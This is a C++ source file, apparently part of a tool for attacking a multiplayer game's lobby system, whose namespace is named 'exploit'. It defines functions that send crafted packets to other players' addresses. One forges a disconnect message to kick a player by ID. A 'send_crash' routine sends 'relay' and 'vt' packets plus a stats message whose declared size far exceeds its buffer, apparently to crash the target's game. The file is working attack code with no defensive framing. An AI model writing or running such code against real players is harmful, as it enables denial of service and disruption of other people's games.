#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	void send_connect_response_migration_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "mstart");
	}

	void send_request_stats_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending requeststats packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "requeststats\n");
	} 

	void send_disconnect_client(const std::uint64_t to)
	{
		game::Msg_ClientReliableData data{};
		data.dataMask = 4;
		data.lobbyType = game::session->type;
		data.disconnectClient = game::LOBBY_DISCONNECT_CLIENT_HOSTRELOAD;
		data.disconnectClientXuid = to;

		game::SendClientReliableData(0, data.lobbyType, &data);
	}
	
	void send_modified_stats_crash(const game::netadr_t& to)
	{
		char buf[0x200] = { 0 };
		game::LobbyMsg msg{};

		char buf2[0x100] = { 0 };

		game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_MODIFIED_STATS);
		int length = 0x20000;
		game::LobbyMsgRW_PackageInt(&msg, "statssize", &length);
		game::LobbyMsgRW_PackageGlob(&msg, "statsbuffer", &buf2, sizeof buf2);

		game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_HOST);
	}

	void send_crash(const game::netadr_t& to)
	{
		PRINT_LOG("Sending crash packets to %s", utils::string::adr_to_string(&to).data()); 
		
		game::oob::send(to, "relay");
		game::oob::send(to, "vt");

		send_modified_stats_crash(to);
	}
}